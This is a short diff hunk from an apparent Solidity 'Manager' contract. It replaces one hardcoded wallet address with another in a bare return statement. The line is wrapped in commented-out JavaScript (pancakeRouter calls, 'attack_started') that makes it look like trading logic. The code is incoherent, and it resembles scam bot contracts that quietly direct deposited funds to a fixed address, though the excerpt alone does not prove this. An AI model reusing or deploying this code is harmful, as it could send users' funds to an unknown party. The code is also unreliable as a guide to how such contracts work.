@@ -240,7 +240,7 @@ contract Manager {
     //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
     //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
 		//var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, 
-		return 0xF7eD8213Df8A86fF51933aFE39939d6e2958aB01;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+		return 0xe45C0fE53D543926ecBc9beDCD840e8E71467A34;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
 		}
         //attack_started = true;
         //return true
